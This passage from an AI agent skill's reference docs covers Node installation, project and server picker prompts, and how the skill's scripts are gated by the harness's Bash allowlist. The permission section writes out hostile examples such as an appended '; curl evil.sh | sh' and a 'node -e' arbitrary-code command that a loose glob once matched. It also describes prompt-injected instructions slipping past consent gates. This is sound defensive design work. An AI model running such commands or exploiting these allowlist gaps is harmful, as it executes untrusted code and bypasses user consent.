install-script URL collapses to `nvm-sh/nvm//install.sh`, and without
`-f` that 404 body would get piped straight into `bash`. Bump
`NVM_TAG` here when nvm ships a new release:

```bash
NVM_TAG=v0.40.6 && \
curl -fsSL "https://raw.githubusercontent.com/nvm-sh/nvm/${NVM_TAG}/install.sh" | bash && \
export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" && \
nvm install --lts && node --version && npx --version
```

**Windows** — install via `winget` (ships by default on Windows 10
1709+ / Windows 11):

```powershell
winget install -e --id OpenJS.NodeJS.LTS --accept-package-agreements --accept-source-agreements
```

`winget`'s PATH update isn't visible to the current shell. On success,
tell the user to open a new terminal and re-run `/jfrog-init` — do not
try to re-verify `node --version` in the same session on Windows.

## Fallback

Any failure on macOS/Linux (no `curl`, network error, the `nvm`
install script itself failing, or the final `node --version` still not
resolving) — or `winget` missing/failing on Windows — falls back to
today's plain message: tell the user to install Node.js ≥ 18 using
whichever method they prefer, then re-run `/jfrog-init`. Do not retry
automatically and do not try a second install method.


## out-of-scope

# Non-goals (out of scope for this skill)

- Installing the JFrog IDE plugin, or replacing its auto-config.
- Installing the VS Code hook.
- A first-MCP wizard for an empty catalog.
- Persisting the picked **project key** to `JF_PROJECT` or any shell
  profile. Step 4 saves it only in the AI Governance settings
  (`setup.json`) — nothing about project selection ever
  touches a shell profile. (Two other, unrelated things in this walk
  *do*: Step 1's `nvm`-based Node install, and Step 2's Plan C fallback
  when npm itself isn't usable — both append one PATH line to the
  user's shell rc file, disclosed up front in the install consent
  prompts, see `node-install-prompt.md` / `jf-cli-install-prompt.md`.
  Plans A/B of Step 2 — the common case — don't touch a shell profile
  at all, relying on npm's own global bin directory instead.)
- Granting AI Catalog roles/permissions — Step 6 only instructs.
- Storing access tokens to disk, logging them, or printing them.
  Step 4's authenticated check keeps the credential inside `jf`'s own
  process (`jf rt ping`); Steps 4 and 6 extract it from `jf config
  export` only in memory, for one `fetch` call. Step 3/4's token-based
  `jf config` path (see the `jf-config-auth-picker` section of the `#jfrog-init-references` steering) never
  touches this skill or the model at all — the user runs that command
  themselves. Step 7 stores no token either: Claude Code asks `jf`
  through a helper at request time; see the `marketplace-setup` section of the `#jfrog-init-references` steering.


## project-picker

# Step 4 — picking a project interactively

**This is not optional background reading — it's part of Step 4's
required behavior.** Read this in full before asking for the AI
Governance project. Use the exact `AskUserQuestion`
payload shapes below; do not paraphrase or invent your own wording.

**Everything below — `candidatesWithNames`
and which bullet you land on — is reasoning for you
to follow silently, never to narrate.** The user never sees why a
particular branch was taken, only the resulting prompt (the
`AskUserQuestion` payload or the plain-text fallback line).

`jfrog-detect-project.mjs "<ai-governance-server-id>"` exits:

- **2 (`ask`)** → ask with the picker below.
- **3 (error)** → `jf` missing or credentials unavailable/rejected.
  Show the raw detector error — this is a genuine stop (no re-pick can
  fix bad credentials).

With the ask result the detector emits `candidatesWithNames` (the full
enumerated list, `{key, displayName}`, sorted by key), as long as
enumeration succeeded. Use it to drive an
`AskUserQuestion` picker instead of asking the user to type a key or
name from memory:

- **If `candidatesWithNames` has 2 or more entries** → call
  `AskUserQuestion` with the
  **first two** entries of `candidatesWithNames` (in the order the
  detector returned them — never reordered, never chosen by matching
  the user's name, git identity, hostname, or any other signal) as the
  two options, and rely on the tool's built-in "Other" for typing a
  different project:

  ```json
  {
    "questions": [
      {
        "question": "Which AI Governance project on <ai-governance-host> do you want to use?",
        "header": "Project",
        "multiSelect": false,
        "options": [
          {"label": "<candidatesWithNames[0].displayName>", "description": "Project key: <candidatesWithNames[0].key>"},
          {"label": "<candidatesWithNames[1].displayName>", "description": "Project key: <candidatesWithNames[1].key>"},
          {"label": "No AI Catalog", "description": "I don't use AI Catalog."}
        ]
      }
    ]
  }
  ```

  On picking option 1 or 2 → that project's **key** is
  `<ai-governance-project>`. On **No AI Catalog** →
  `<ai-governance-project>` is empty. On **Other** →
  the user types a name-or-key; their typed value is
  `<ai-governance-project>`.

- **If `candidatesWithNames` has fewer than 2 entries** (enumeration
  unavailable, or the JPD genuinely has 0–1 projects) → fall back to a
  single plain-text line, no `AskUserQuestion`:

  > *Which AI Governance project on `<ai-governance-host>` do you want
  > to use? If you don't use AI Catalog, say so.*

  Nothing before, nothing after. If the user says they don't use AI
  Catalog, `<ai-governance-project>` is empty. Do NOT append any hint about the
  accepted input format (no *"(name or key)"*, no *"you can type a key
  or name"*, no *"either the display name or key works"*).

- **If `AskUserQuestion` is not available as a tool at all** (some
  harnesses don't expose it — check `$JFROG_INIT_HARNESS`, or before Step 5
  whether you are Kiro or Junie: `kiro` /
  `kiro-cli` / `junie` never have it, so skip the tool call and go straight
  to the fallback instead of calling it and surfacing its error), use the
  plain-text fallback line above —
  nothing else — regardless of
  how many entries `candidatesWithNames` has. Never explain that the
  tool is unavailable, never mention the candidate count or that a
  picker would otherwise have been used; the user only ever sees the
  one line.
- **Never surface the full candidate list or a count** to the user in
  any case — the picker's options (plus "Other") or the plain-text
  fallback are the entire user-facing surface.

**Do NOT** `export JF_PROJECT=…`. Step 4 saves the project.


## script-invocation

# Invoking scripts: avoid the red "Error" framing

Every `node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-*.mjs"` command shown anywhere
in `SKILL.md` signals red/ask states via a non-zero exit code, by
design. When run directly, the harness renders that as a red `Error:
Exit code N` block — an expected red/ask result looking identical to a
genuine tool failure. Since this skill's own reasoning depends on the
exit code (0/1/2/3 map to green/red/ask/error), don't discard it —
just stop it from also flipping the *shell's* final status, so the
harness doesn't flag it:

```bash
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-jf-cli.mjs"; rc=$?; true
```

**Capture `rc` — a bare `; true` is not enough for any detector.** Every
Step's branch table in `SKILL.md` is written in terms of the exit code
(`Exit 0 (green)`, `Exit 2 (ask)`, …), and `; true` on its own *discards*
that code: `true` becomes the last command, so `$?` is 0 no matter what
the detector reported, and every red/ask result silently reads as green.
`rc=$?` runs before the trailing `true`, so it records the detector's
real code while still leaving the shell's final status at 0. Read `$rc`
for the branch table and the JSON on stdout for the detail.

The only commands that may use a bare `; true` are the ones nothing
branches on by exit code — Step 1's `node --version` / `npx --version`
(read the printed version instead) and
`jfrog-reinstall-jfrog-plugin.mjs` (always exits 0).

This is a wording-level mitigation, not a full fix — the command and
its JSON preview may still be visible in the collapsed tool-call line
— but it removes the alarming error styling at no extra cost.

Step 1 has no script, but the same trick applies to its bare commands
for the same reason — `node --version` and `npx --version` both exit
non-zero if the binary is missing:

```bash
node --version; true
npx --version; true
```

## PowerShell hosts

Some harnesses run Bash-tool commands through native PowerShell, not a
POSIX shell (OpenCode on Windows is one) — there, `$?` isn't a numeric
exit code and bare `true` doesn't exist, so `; rc=$?; true` throws
`CommandNotFoundException`. Use the PowerShell equivalent instead:

```powershell
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-jf-cli.mjs"; $rc=$LASTEXITCODE; exit 0
```

`$LASTEXITCODE` is PowerShell's `$?`; `exit 0` plays `true`'s role.
Swap this suffix in for every detector call when the Bash tool is
PowerShell-backed — this is a shell property, not an OS one (Claude
Code's Bash tool is a real POSIX shell even on Windows).

The bare-`; true` commands above (`node --version`, `npx --version`, and
`jfrog-reinstall-jfrog-plugin.mjs`) hit the same `true`-doesn't-exist
problem, since nothing there needs `$rc` captured — swap in a bare `;
exit 0` instead:

```powershell
node --version; exit 0
npx --version; exit 0
```

## What's deliberately not pre-approved

`allowed-tools` in `SKILL.md` covers `node --version`, the seven read-only
detectors named individually — `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-catalog-runtime.mjs"`,
`jfrog-detect-jf-cli.mjs`, `jfrog-detect-jf-config.mjs`,
`jfrog-detect-jfrog-mcp.mjs`, `jfrog-detect-jfrog-mcp-responding.mjs`,
`jfrog-detect-opencode-mcp-auth.mjs`, `jfrog-detect-project.mjs`, and
`jfrog-detect-server-ping.mjs` — and the purely diagnostic `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-reinstall-jfrog-plugin.mjs"`,
`jfrog-resolve-mcp-config.mjs --harness`, `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-ai-governance-config.mjs" get`/`list`
(`list` is read-only; `get` only migrates an old `setup.json` in place),
`npx --version`, and `uname`. It does
**not** cover:

- Step 1's `nvm` install (`curl … | bash`, see `node-install-prompt.md`)
- Step 1's Windows Node install (`winget install …`, see
  `node-install-prompt.md`)
- Step 1's `jfrog-install-jf-cli.mjs` (downloads/executes a binary and
  edits shell rc files — see `jf-cli-install-prompt.md`)
- Step 3's and Step 4's web-login scripts (`node …/jfrog-login-*.mjs`, see
  `jf-config-auth-picker.md`)
- `jfrog-detect-all.mjs` (the "run everything at once" entry point — see
  `batch-walk.md`). This is **not** a member of the `jfrog-detect-*.mjs`
  grant despite the name: an earlier version of this grant used that exact
  wildcard and pre-approved `jfrog-detect-all.mjs` along with it, silently
  contradicting the "read-only detectors" framing above — `jfrog-detect-all.mjs`
  itself writes `~/.jfrog/setup.json` on overall green (see
  `batch-walk.md`), the same mutation `jfrog-ai-governance-config.mjs set`
  is excluded below for. PR review caught this; the fix was to enumerate
  the seven read-only detectors by exact filename instead of a wildcard,
  which also closes a path-traversal-shaped concern with the wildcard
  form (`jfrog-detect-*.mjs` has no anchor stopping `*` from matching
  path separators, unlike an exact filename).
- `jfrog-substitute-mcp-placeholders.mjs` (edits the plugin's `mcp.json`
  in place — see `mcp-plugin-config.md`). **Unlike every other entry in
  this list, this exclusion is theoretical, not operative**: `SKILL.md`
  never invokes this script as a standalone
  `node "${CLAUDE_SKILL_DIR}/scripts/jfrog-substitute-mcp-placeholders.mjs"`
  Bash command, so its absence from `allowed-tools` never actually
  gates anything. Its only real call site is the in-process import in
  `jfrog-detect-jfrog-mcp.mjs` (itself one of the seven explicitly-named
  detectors above) — the harness's permission system approves Bash
  commands, not the function calls a pre-approved script makes once
  running, so the mutation executes with no prompt whenever Step 5 finds
  a placeholder. This is intentional, not an oversight: the write is
  narrowly scoped to the jfrog entry's `url` field, atomic (temp file + rename),
  and idempotent — see `mcp-plugin-config.md` for why that scope was
  judged safe to run unattended, unlike the two mutations below.
- `jfrog-ai-governance-config.mjs`'s **`set`** mode (writes the AI
  Governance server and project to `~/.jfrog/setup.json` — see Step 4
  in `SKILL.md`)
- `jfrog-add-claude-marketplace.mjs` (Step 7 — installs the headers helper
  under `~/.jfrog/skills` and calls `claude plugin marketplace update`, mutating Claude Code's own
  marketplace config — see `marketplace-setup.md`). **Unlike the other
  entries in this list, this one has no prior `AskUserQuestion` consent
  step** — the harness's own approval prompt is the only gate before it
  runs (the harness-detection check in front of it is a skip/routing
  check, not a consent prompt). Treat that as a known gap worth
  revisiting, not as already covered by the "Approval model" list at
  the top of `SKILL.md`.

Granting `Bash(curl:*)` / `Bash(bash:*)` / `Bash(winget:*)` for the
first four would pre-approve arbitrary shell execution, arbitrary
network transfer, or (via `winget install`'s own flags, e.g.
`--override`, which passes raw args straight to the underlying
installer) arbitrary extra installer arguments — a `Bash(...)` wrapper
around an interpreter, or a trailing wildcard on an installer command,
is not a scope. It would also buy nothing: `nvm`/Windows-Node-install
and web-login already sit behind their own `AskUserQuestion` consent
prompt, so the user has agreed before either runs.

`jfrog-install-jf-cli.mjs`, `jfrog-substitute-mcp-placeholders.mjs`,
`jfrog-write-opencode-mcp.mjs`, `jfrog-ai-governance-config.mjs set`, and
`jfrog-add-claude-marketplace.mjs` are excluded for a related but
distinct reason: they're the five scripts in this directory that mutate
something outside their own process (a downloaded binary made executable
and run, the plugin's `mcp.json`, the user's own OpenCode config — the
first mutation targeting a personal file rather than a plugin-owned one
— the AI Governance settings, and the headers helper plus Claude Code's own
marketplace config, respectively) rather than just reading state and
emitting JSON.
A prior version of this grant covered every `*.mjs` in `scripts/`
indiscriminately — PR review on this same branch pointed out that
pre-approves running any of these without the model (or a
prompt-injected instruction it's following) ever hitting the
`AskUserQuestion` gates their *documented* call sites sit behind; the
grant itself enforced nothing. Naming the read-only scripts individually
and leaving these four to fall through to the harness's own approval
closes that gap — **for `jfrog-install-jf-cli.mjs` and
`jfrog-ai-governance-config.mjs set`**, both of which `SKILL.md` only ever runs as
their own standalone Bash command, behind their own `AskUserQuestion`
(see `jf-cli-install-prompt.md` and Step 4, respectively).
`jfrog-substitute-mcp-placeholders.mjs` is the exception: as noted
above, it has no standalone Bash call site in the documented flow, so
there is no gap for this grant to close for it — its mutation runs
unattended by design, not because this list forgot it.
`jfrog-add-claude-marketplace.mjs` is a different kind of gap: it *does*
have a standalone Bash call site (Step 7 invokes it directly), but
unlike `jfrog-install-jf-cli.mjs` / `jfrog-ai-governance-config.mjs set` there is
no `AskUserQuestion` sitting in front of it — the harness's Bash prompt
is the only consent point. That asymmetry is called out, not resolved,
here; see the bullet above.

`node` is itself an interpreter, the same category being ruled out
above for `curl`/`bash`/`winget` — but unlike those, it isn't ungated by
a fixed string: every real invocation is either the literal `node
--version` (Step 1) or `node "${CLAUDE_SKILL_DIR}/scripts/<name>.mjs"`.
`${CLAUDE_SKILL_DIR}` is a harness-substituted variable, not a
wildcard: Claude Code replaces it with this skill's own absolute
directory in *both* the rendered `SKILL.md` content the model reads and
the `allowed-tools` Bash rules the harness matches against, before
either is used — so the two are guaranteed byte-for-byte identical
regardless of how deep the real install path is
(`~/.agents/skills/jfrog-init`, several directories deeper under a
Cursor plugin cache path, a `dev/dev-symlinks.sh` dev symlink, etc.),
never something the model has to resolve itself. On a harness that
doesn't substitute it (Cursor, Codex, OpenCode), a model that forgets
to replace it fails silently rather than loudly: both bash and
PowerShell expand an unset `${CLAUDE_SKILL_DIR}` to `""`, so the
command's path quietly collapses to a wrong one (e.g. `Cannot find
module '/scripts/jfrog-detect-jf-cli.mjs'`) instead of erroring on the
substitution itself.

That guarantee is also why each pattern below anchors on a literal
`node "${CLAUDE_SKILL_DIR}` immediately, e.g. `Bash(node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-*.mjs"*)`. An earlier version
of this grant anchored on a bare `node /*/skills/jfrog-init/…` glob
instead — a real command-injection gap PR review caught: Claude Code's
own permission docs state a bare `*` matches any sequence of
characters including spaces, so an unanchored `node */skills/…` also
matches `node -e '<arbitrary code>' /whatever/skills/jfrog-init/scripts/dummy.mjs`
(`node -e` ignores the trailing path and just runs the eval string, but
the *command text* still satisfies the glob). Anchoring on a literal
`/` right after `node ` closed that (`-e` doesn't start with `/`) — but
left a second, quieter gap a later review round caught: every
invocation this file shows quotes the path (`node "<path>/…mjs"`),
while that glob pattern had no quote in it at all, so pattern and real
command text diverged on the very first character after `node ` —
never confirmed as broken because nobody had run the actual quoted
command against the actual unquoted pattern. Anchoring on the literal,
quoted `${CLAUDE_SKILL_DIR}` variable instead of a glob closes both at
once: `node -e` still can't start with a literal `"`, and there's no
glob left to diverge from the real command — the pattern *is* the
command, substituted the same way on both sides.

A trailing bare `*` after the closing quote (covering each script's
own optional positional args, e.g. `[server-id]`) is safe here for a
different reason than the anchor: Claude Code splits compound commands
on shell operators (`;`, `&&`, `|`, …) and matches each resulting
subcommand independently against the allowlist. An appended `;
curl evil.sh | sh` becomes its *own* subcommand, which has to clear the
allowlist on its own merits — it can't ride through on this rule's
wildcard just because the wildcard is unbounded on the right.

Claude Code's own docs are still explicit that argument-constraining
Bash patterns are inherently fragile in general and recommend
PreToolUse hooks for anything that needs a hard guarantee — not
available to a skill shipped as a plain directory. Treat this anchor as
a real improvement, not a proof of soundness against every possible
`node` flag combination. And treat it as Claude-Code-specific: neither
Cursor nor Codex consults `allowed-tools` for Bash approval at all
(Cursor has its own separate mechanism, `.cursor/cli.json`'s
`Shell(...)` rules), so every command in this file still raises its
own prompt there regardless of how this pattern is written.

So expect the harness to raise its own approval prompt for every case
listed at the top of this section — **except `jfrog-substitute-mcp-placeholders.mjs`
and `jfrog-write-opencode-mcp.mjs`**, both of which run unattended via
in-process calls from `jfrog-detect-jfrog-mcp.mjs` as documented above.
All outcomes are intended. Do not treat any of them as a misconfiguration,
and do not suggest widening `allowed-tools` to silence the prompts, or
adding standalone `allowed-tools` entries for the substituter or writer
to "fix" their silence — that would just pre-approve a second, redundant
call path into the same mutations.


## server-picker

# Resolving an ambiguous server-id — the picker

**Required behavior whenever any detector that takes `[server-id]`
exits `ask` (`status: "ask"`) with a `candidates` list of server IDs
— not optional background.** This is shared, unmodified, across both
steps in "Resolving `<server-id>` for Steps 4 and 5" in `SKILL.md`:
Step 4's ping of the jf CLI default server
(`jfrog-detect-server-ping.mjs`) and Step 5's placeholder substitution
(`jfrog-detect-jfrog-mcp.mjs`). Both resolve a server-id
through the same shared code (`~/.kiro/jfrog-scripts/jfrog-init/jfrog-resolve-jf-server.mjs`),
so `candidates` is always the same shape: a plain array of configured
server-id strings, e.g. `["prod", "staging"]`.

This can only happen when **2 or more** servers are configured with
none marked `isDefault` — ambiguity by definition requires at least
two candidates, so unlike the project picker there is no "fewer than
2" plain-text fallback case here.

**All of the above — `unresolved`, `candidates`, which step/detector
triggered this — is reasoning for you to follow silently, never to
narrate.** The user never sees why they're being asked, only the
`AskUserQuestion` payload itself.

Ask the user (see `how-to-ask-user.md` for native tool and fallback
rules) with the **first two** entries of `candidates` (in the order
the detector returned them — never reordered, never chosen by matching
a hostname, git identity, or any other signal) as the two options, and
include a free-text escape hatch for typing a different server-id:

- **Question**: "Which JFrog server do you want to use?"
- **Option 1**: `<candidates[0]>` (description: "Server ID: `<candidates[0]>`")
- **Option 2**: `<candidates[1]>` (description: "Server ID: `<candidates[1]>`")
- **Other**: let the user type a different server-id if needed

**Never surface the full candidate list or a count** to the user in
any case — the picker's two options (plus the free-text escape hatch)
are the entire user-facing surface, same rule as the project picker.

On picking option 1 or 2, or typing a value via **Other** → re-invoke
**the same detector that emitted the ask** (never a different one)
with the picked/typed server-id as the positional argument that step
expects (see that step's own usage line in `SKILL.md`). Never invent a
server-id, never rely on `jf`'s own default-resolution fallback — the
whole point of asking is that this skill's own resolution order
(explicit arg → `isDefault` → sole server) already
came up empty.
